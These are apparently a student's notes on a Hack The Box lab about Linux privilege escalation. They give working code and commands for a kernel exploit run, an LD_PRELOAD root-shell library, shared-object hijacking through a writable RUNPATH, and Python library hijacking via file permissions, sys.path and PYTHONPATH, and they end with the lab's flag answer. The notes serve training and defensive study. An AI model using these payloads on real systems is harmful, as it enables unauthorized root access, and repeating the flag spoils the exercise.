# ☄️ Linux Internals-based Privilege Escalation

## Kernel Exploits

Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges.

First we check the Kernel level and Linux OS version.

```shell-session
uname -a
```

```shell-session
cat /etc/lsb-release 
```

So here we have a Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. After looking online we have `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. We need to compile the exploit code using [gcc](https://linux.die.net/man/1/gcc) and set the executable bit

```shell-session
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

Then we can run it and hopefully we'll get a root shell

```shell-session
./kernel_exploit 
```

## Shared Libraries

It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs.

There are  `static libraries` (denoted by the .a file extension) and `dynamically linked shared object libraries` (denoted by the .so file extension)

&#x20;the `LD_PRELOAD` environment variable can load a library before executing a binary. The shared objects required by a binary can be viewed using the `ldd` utility.

```shell-session
htb_student@NIX02:~$ ldd /bin/ls
	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
<SNIP>
```

The output above lists all the libraries required by `/bin/ls`

`To` escalate privileges with  [LD\_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld\_preload.html) we need a user with `sudo` privileges.

```shell-session
htb_student@NIX02:~$ sudo -l
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

we can exploit the `LD_PRELOAD` issue to run a custom shared library file.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can compile it with this command ->

```shell-session
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

And our privesc would look like this:

```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
id
uid=0(root) gid=0(root) groups=0(root)
```

## Shared Object Hijacking

Programs and binaries under development usually have custom libraries associated with them.

```shell-session
htb-student@NIX02:~$ ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

We can use [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) to print the shared object required by a binary or shared object.

```shell-session
htb-student@NIX02:~$ ldd payroll
linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
```

We see a non-standard library named `libshared.so`

Now we can  to load shared libraries from custom locations. To do this we can use the `RUNPATH` configuration. **Libraries in this folder are given preference over other folders**. This can be inspected using the [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) utility.

```shell-session
htb-student@NIX02:~$ readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

The configuration allows the loading of libraries from the `/development` folder, which is writable by all users.&#x20;

placing a malicious library in `/development`, which will take precedence over other folders because entries in this file are checked first

Before compiling a library, we need to find the function name called by the binary.

```shell-session
htb-student@NIX02:~$ ldd payroll
linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

```shell-session
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```shell-session
htb-student@NIX02:~$ ./payroll 
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

We can copy an existing library to the `development` folder. Running `ldd` against the binary lists the library's path as `/development/libshared.`so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

Then we can compile

```shell-session
gcc src.c -fPIC -shared -o /development/libshared.so
```

```shell-session
htb-student@NIX02:~$ ./payroll 
***************Inlane Freight Employee Database***************
Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

## Python Library Hijacking

&#x20;there are three basic vulnerabilities where hijacking can be used:

1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variable

### Wrong Write Permissions

If we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` set.

```shell-session
htb-student@lpenix:~$ ls -l mem_status.py
-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

we can execute this script with the privileges of root

In the content of the python script there is this import ->

```python
#!/usr/bin/env python3
import psutil
available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
```

So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.

```shell-session
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
<SNIP>
htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Content of the module:

```python
...SNIP...
def virtual_memory():
	...SNIP...
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret
...SNIP...
```

This is the part in the library where we can insert our code.

we can insert the command `id` and check during the execution of the script if the inserted code is executed.

```python
...SNIP...
def virtual_memory():
	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret
...SNIP...
```

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

So now we can  insert a reverse shell that connects to our host as `root`.

### Library Path

&#x20;The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list.

```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'
/usr/lib/python38.zip
/usr/lib/python3.8
<SNIP>
```

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

Our goal is that Python accesses the first hit it finds and imports it before reaching the original and intended module.

earlier we saw that `psutil` module was imported into the `mem_status.py` script. This is how We can see `psutil`'s default installation location

```shell-session
htb-student@lpenix:~$ pip3 show psutil
Location: /usr/local/lib/python3.8/dist-packages
```

Now we can start to  see if there might be any misconfigurations in the environment to allow us `write` access to any of them.

```shell-session
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
```

&#x20;`/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.

we need to create a file called `psutil.py ->`

```python
#!/usr/bin/env python3
import os
def virtual_memory():
    os.system('id')
```

and if once again we run the `mem_status.py` script using `sudo` like in the previous example.

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py
uid=0(root) gid=0(root) groups=0(root)
```

### PYTHONPATH Environment Variable

`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules.

```shell-session
htb-student@lpenix:~$ sudo -l 
<SNIP>
  (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

&#x20;we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set.

&#x20;This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script

```shell-session
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
```

&#x20;we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import.

_**Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer.**_

for this one i had a hard time, we need to write the psutil.py in the same directory as mem\_status.py and run it using this command ->

```
sudo /usr/bin/python3 ~/mem_status.py
HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
```
